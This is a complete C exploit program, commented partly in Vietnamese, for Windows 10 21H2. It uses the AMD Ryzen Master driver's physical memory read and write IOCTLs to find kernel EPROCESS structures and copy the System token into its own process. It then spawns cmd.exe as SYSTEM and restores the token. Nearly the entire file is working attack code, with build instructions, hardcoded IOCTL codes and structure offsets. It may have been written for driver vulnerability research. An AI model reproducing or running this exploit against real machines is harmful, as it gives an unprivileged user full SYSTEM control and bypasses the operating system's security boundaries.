/*
 * step3_token_theft.c — Token theft → SYSTEM via AMD Ryzen Master
 *
 * Từ step1/step2:
 *   System EPROCESS PA = 0x00000001BE466080
 *   Token offset (Win10 21H2 19041-19044) = +0x4B8
 *
 * Chain:
 *   1. Mở AMD driver (không cần SeLoadDriverPrivilege)
 *   2. Scan EPROCESS trong physical memory → System token + current process token PA
 *   3. PEB cross-check: EPROCESS->Peb phải khớp TEB->Peb → xác nhận đúng EPROCESS
 *   4. Interactive confirm: in giá trị, chờ Enter trước khi write
 *   5. phys_write(current_eproc.Token) = System token → SYSTEM
 *   6. Spawn cmd.exe (chạy as SYSTEM), đợi exit
 *   7. Restore token
 *
 * Build:
 *   cl /nologo /W3 /O2 step3_token_theft.c /link kernel32.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

/* Win10 21H2 (19041-19044) */
#define OFF_DTB    0x028   /* DirectoryTableBase (CR3)          */
#define OFF_PID    0x440   /* UniqueProcessId                   */
#define OFF_FLINK  0x448   /* ActiveProcessLinks.Flink          */
#define OFF_BLINK  0x450   /* ActiveProcessLinks.Blink          */
#define OFF_TOKEN  0x4B8   /* Token (_EX_FAST_REF)              */
#define OFF_PEB    0x550   /* Peb (_PEB*) — user-mode VA        */
#define OFF_NAME   0x5A8   /* ImageFileName[15]                 */
#define EPROC_SZ   (OFF_NAME + 16)

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;
static HANDLE    g_dev = INVALID_HANDLE_VALUE;

/* ── Ranges ──────────────────────────────────────────────────────────────── */
static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i=0;;i++) {
        vn=sizeof vname; vd=0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS) {sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20) { free(buf); return; }
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0; i<cnt&&g_nranges<MAX_RANGES; i++,p+=20) {
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

/* ── Phys R/W ────────────────────────────────────────────────────────────── */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz);
    if (!out) return 0;
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              &in, sizeof(in), out, out_sz, &got, NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out);
    return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) {
        printf("  [!] BLOCKED write 0x%llX — not in RAM range\n",
               (unsigned long long)pa);
        return 0;
    }
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz);
    if (!in_buf) return 0;
    *(uint64_t*)(in_buf)     = pa;
    *(uint32_t*)(in_buf+8)   = sz;
    memcpy(in_buf+12, data, sz);
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf);
    return ok;
}

/* ── EPROCESS scan ───────────────────────────────────────────────────────── */
typedef struct {
    uint64_t pa;
    uint64_t token;
    uint64_t cr3;
    uint64_t peb;    /* Peb field at OFF_PEB — used for cross-check */
    uint64_t flink;
    uint64_t blink;
    char     name[16];
} EprocInfo;

static int scan_eprocess(uint32_t target_pid,
                         EprocInfo *system_out,
                         EprocInfo *target_out)
{
    uint8_t page[0x1000];
    /* Read one extra field past OFF_NAME so we capture PEB too */
    uint8_t ep[EPROC_SZ];
    uint64_t last_prog = 0;
    int found_sys = 0, found_tgt = 0;

    for (int ri=0; ri<g_nranges && !(found_sys&&found_tgt); ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa=g_ranges[ri].base; pa+0x1000<=end; pa+=0x1000) {

            if (pa-last_prog >= 0x40000000ULL) {
                printf("  [%5llu MB]  sys=%s  cur=%s\n",
                       (unsigned long long)(pa>>20),
                       found_sys ? "OK" : "..",
                       found_tgt ? "OK" : "..");
                last_prog = pa;
                if (found_sys && found_tgt) goto done;
            }

            if (!phys_read(pa, page, sizeof page)) continue;

            for (int off=0; off+8<=0x1000; off+=8) {
                uint8_t c = page[off];
                if (c<'A'||c>'z'||c=='['||c=='\\'||c==']'||c=='^'||c=='`') continue;

                uint64_t epa = pa+(uint64_t)off - OFF_NAME;
                if (!pa_in_range(epa, EPROC_SZ)) continue;
                if (!phys_read(epa, ep, EPROC_SZ)) continue;

                uint64_t pid = *(uint64_t*)(ep+OFF_PID);
                if (pid != 4 && pid != target_pid) continue;
                if (memcmp(ep+OFF_NAME, page+off, 4)) continue;

                int name_ok = 1;
                for (int k=0; k<15; k++) {
                    uint8_t nc = ep[OFF_NAME+k];
                    if (nc==0) break;
                    if (nc<0x20||nc>0x7E) { name_ok=0; break; }
                }
                if (!name_ok) continue;

                uint64_t token = *(uint64_t*)(ep+OFF_TOKEN);
                uint64_t cr3   = *(uint64_t*)(ep+OFF_DTB);
                uint64_t flink = *(uint64_t*)(ep+OFF_FLINK);
                uint64_t blink = *(uint64_t*)(ep+OFF_BLINK);

                if ((token & ~0xFULL) < 0xFFFF800000000000ULL) continue;
                if (!cr3 || (cr3&0xFFF) || cr3>0x10000000000ULL) continue;
                if (pid==0 || pid>0xFFFF) continue;

                /* ActiveProcessLinks: cả hai Flink+Blink phải là kernel VA */
                if (flink < 0xFFFF800000000000ULL ||
                    blink < 0xFFFF800000000000ULL) continue;

                /* PEB nằm trong buffer ep (OFF_PEB=0x550 < EPROC_SZ=0x5B8) */
                uint64_t peb = *(uint64_t*)(ep + OFF_PEB);

                /* System process: name phải là "System" chính xác + PEB phải NULL */
                if (pid == 4) {
                    if (memcmp(ep+OFF_NAME, "System\0", 7) != 0) continue;
                    if (peb != 0) continue;  /* System có no user-mode PEB */
                }

                if (pid==4 && !found_sys) {
                    system_out->pa    = epa;
                    system_out->token = token;
                    system_out->cr3   = cr3;
                    system_out->peb   = peb;
                    system_out->flink = flink;
                    system_out->blink = blink;
                    memcpy(system_out->name, ep+OFF_NAME, 15);
                    system_out->name[15] = 0;
                    found_sys = 1;
                    printf("  [+] System  EPROCESS PA = 0x%016llX  token=0x%016llX\n",
                           (unsigned long long)epa, (unsigned long long)token);
                }
                if (pid==target_pid && !found_tgt) {
                    target_out->pa    = epa;
                    target_out->token = token;
                    target_out->cr3   = cr3;
                    target_out->peb   = peb;
                    target_out->flink = flink;
                    target_out->blink = blink;
                    memcpy(target_out->name, ep+OFF_NAME, 15);
                    target_out->name[15] = 0;
                    found_tgt = 1;
                    printf("  [+] Current EPROCESS PA = 0x%016llX  token=0x%016llX  name=%s\n",
                           (unsigned long long)epa, (unsigned long long)token,
                           target_out->name);
                }
            }
        }
    }
done:
    return found_sys && found_tgt;
}

/* ═══════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    printf("=== Step 3: Token Theft -> SYSTEM ===\n\n");

    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev==INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Device opened\n\n");

    load_ranges();
    printf("[1] Loaded %d physical ranges\n\n", g_nranges);

    uint32_t my_pid = GetCurrentProcessId();
    printf("[2] Scanning EPROCESS (System pid=4, current pid=%u)...\n", my_pid);

    EprocInfo sys_ep = {0}, cur_ep = {0};
    if (!scan_eprocess(my_pid, &sys_ep, &cur_ep)) {
        printf("\n[-] Could not find both EPROCESS\n");
        CloseHandle(g_dev); return 1;
    }
    printf("\n");

    /* ── [3] VALIDATE ─────────────────────────────────────────────────────── */
    printf("[3] Validation:\n");
    printf("    System  PA=0x%016llX  name='%s'\n",
           (unsigned long long)sys_ep.pa, sys_ep.name);
    printf("    System  token=0x%016llX  cr3=0x%016llX\n",
           (unsigned long long)sys_ep.token, (unsigned long long)sys_ep.cr3);
    printf("    System  flink=0x%016llX  blink=0x%016llX\n\n",
           (unsigned long long)sys_ep.flink, (unsigned long long)sys_ep.blink);

    printf("    Current PA=0x%016llX  name='%s'  PID=%u\n",
           (unsigned long long)cur_ep.pa, cur_ep.name, my_pid);
    printf("    Current token=0x%016llX  cr3=0x%016llX\n",
           (unsigned long long)cur_ep.token, (unsigned long long)cur_ep.cr3);
    printf("    Current flink=0x%016llX  blink=0x%016llX\n\n",
           (unsigned long long)cur_ep.flink, (unsigned long long)cur_ep.blink);

    if ((sys_ep.token & ~0xFULL) < 0xFFFF800000000000ULL ||
        (cur_ep.token & ~0xFULL) < 0xFFFF800000000000ULL) {
        printf("[-] Token không phải kernel VA — abort\n");
        CloseHandle(g_dev); return 1;
    }

    /* ── [4] PEB CROSS-CHECK ─────────────────────────────────────────────────
     * EPROCESS->Peb (tại +0x550) phải khớp với PEB của process hiện tại.
     * Đây là cách duy nhất confirm đúng EPROCESS mà không cần page table walk.
     * False positive không thể biết địa chỉ PEB của ta.
     * ──────────────────────────────────────────────────────────────────────── */
    printf("[4] PEB cross-check (EPROCESS->Peb vs TEB->Peb):\n");

    /* Lấy PEB address từ TEB (GS:[0x60]) — luôn đúng với process hiện tại */
    uint64_t teb_peb = (uint64_t)__readgsqword(0x60);
    uint64_t ep_peb  = cur_ep.peb;

    printf("    TEB->Peb           = 0x%016llX  (user-mode source, authoritative)\n",
           (unsigned long long)teb_peb);
    printf("    EPROCESS+0x550     = 0x%016llX  (physical read)\n",
           (unsigned long long)ep_peb);

    if (ep_peb != teb_peb) {
        printf("\n    [!!!] PEB MISMATCH — scan trả về EPROCESS SAI!\n");
        printf("    --> Đây là false positive, write sẽ gây BSOD.\n");
        printf("    --> Aborting.\n\n");

        /* Diagnostic: thử probe thêm các offset lân cận */
        printf("    [diag] Probe EPROCESS+0x548 / +0x550 / +0x558:\n");
        uint64_t v548=0, v550=0, v558=0;
        phys_read(cur_ep.pa + 0x548, &v548, 8);
        phys_read(cur_ep.pa + 0x550, &v550, 8);
        phys_read(cur_ep.pa + 0x558, &v558, 8);
        printf("      +0x548 = 0x%016llX  %s\n",
               (unsigned long long)v548, v548==teb_peb?"<-- PEB match":"");
        printf("      +0x550 = 0x%016llX  %s\n",
               (unsigned long long)v550, v550==teb_peb?"<-- PEB match":"");
        printf("      +0x558 = 0x%016llX  %s\n",
               (unsigned long long)v558, v558==teb_peb?"<-- PEB match":"");
        printf("\n    Nếu một trong 3 offset trên match, cập nhật #define OFF_PEB.\n");

        CloseHandle(g_dev); return 1;
    }
    printf("    [+] PEB MATCH — EPROCESS xac nhan chinh xac!\n\n");

    /* ── [5] PRE-WRITE RE-READ ────────────────────────────────────────────── */
    printf("[5] Pre-write verification:\n");
    uint64_t token_pa = cur_ep.pa + OFF_TOKEN;

    uint64_t preread = 0;
    phys_read(token_pa, &preread, 8);
    printf("    Token PA           = 0x%016llX\n",
           (unsigned long long)token_pa);
    printf("    Token (scan)       = 0x%016llX\n",
           (unsigned long long)cur_ep.token);
    printf("    Token (re-read)    = 0x%016llX  %s\n",
           (unsigned long long)preread,
           preread==cur_ep.token ? "[MATCH - PA stable]" : "[MISMATCH - EPROCESS moved?]");

    /* Chỉ so sánh phần pointer (bỏ lower 4 bits = _EX_FAST_REF refcount).
     * Kernel thay đổi refcount liên tục — chỉ mismatch nếu pointer thực sự đổi. */
    if ((preread & ~0xFULL) != (cur_ep.token & ~0xFULL)) {
        printf("\n[-] Token POINTER thay doi (khong phai refcount) — PA sai, abort.\n");
        printf("    scan   pointer = 0x%016llX\n", (unsigned long long)(cur_ep.token & ~0xFULL));
        printf("    reread pointer = 0x%016llX\n", (unsigned long long)(preread & ~0xFULL));
        CloseHandle(g_dev); return 1;
    }
    printf("    (lower nibble refcount OK to differ: 0x%llX -> 0x%llX)\n\n",
           (unsigned long long)(cur_ep.token & 0xF),
           (unsigned long long)(preread & 0xF));
    printf("\n");

    /* ── [6] INTERACTIVE CONFIRM ─────────────────────────────────────────── */
    printf("[6] Chuan bi WRITE:\n");
    printf("    PA  : 0x%016llX  (current EPROCESS.Token)\n",
           (unsigned long long)token_pa);
    printf("    FROM: 0x%016llX  (token hien tai)\n",
           (unsigned long long)cur_ep.token);
    printf("    TO  : 0x%016llX  (System token)\n",
           (unsigned long long)sys_ep.token);
    printf("\n    Kiem tra cac gia tri tren.\n");
    printf("    --> Nhan Enter de proceed, Ctrl+C de abort: ");
    fflush(stdout);
    getchar();
    printf("\n");

    /* ── [7] TOKEN SWAP ──────────────────────────────────────────────────── */
    printf("[7] Writing System token...\n");
    if (!phys_write(token_pa, &sys_ep.token, 8)) {
        printf("    [-] phys_write failed (err=%lu)\n", GetLastError());
        CloseHandle(g_dev); return 1;
    }

    uint64_t verify = 0;
    phys_read(token_pa, &verify, 8);
    printf("    Verify: 0x%016llX  %s\n\n",
           (unsigned long long)verify,
           verify==sys_ep.token ? "[MATCH]" : "[MISMATCH - check token offset]");

    if (verify != sys_ep.token) {
        printf("[-] Mismatch — restoring and abort\n");
        phys_write(token_pa, &cur_ep.token, 8);
        CloseHandle(g_dev); return 1;
    }
    printf("    [+] Token written!\n\n");

    /* ── [8] SPAWN + WAIT ────────────────────────────────────────────────── */
    printf("[8] Spawning cmd.exe — go 'whoami', then 'exit' de restore token...\n\n");
    STARTUPINFOA si = {sizeof si};
    PROCESS_INFORMATION pi = {0};
    /*
     * Dung CREATE_NEW_CONSOLE + WaitForSingleObject(INFINITE) thay vi Sleep(500).
     * Token chi duoc restore SAU KHI cmd.exe exit — tranh race condition.
     */
    BOOL spawned = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe", NULL,
        NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    if (spawned) {
        printf("    [+] cmd.exe PID=%lu  -- go 'whoami', 'exit' khi xong\n",
               pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printf("    [+] cmd.exe da exit\n\n");
    } else {
        printf("    [-] CreateProcess failed: %lu\n\n", GetLastError());
    }

    /* ── [9] RESTORE ─────────────────────────────────────────────────────── */
    printf("[9] Restoring original token...\n");
    if (phys_write(token_pa, &cur_ep.token, 8))
        printf("    [+] Token restored\n");
    else
        printf("    [-] Restore FAILED — process unstable!\n");

    CloseHandle(g_dev);
    printf("\nDone.\n");
    return 0;
}
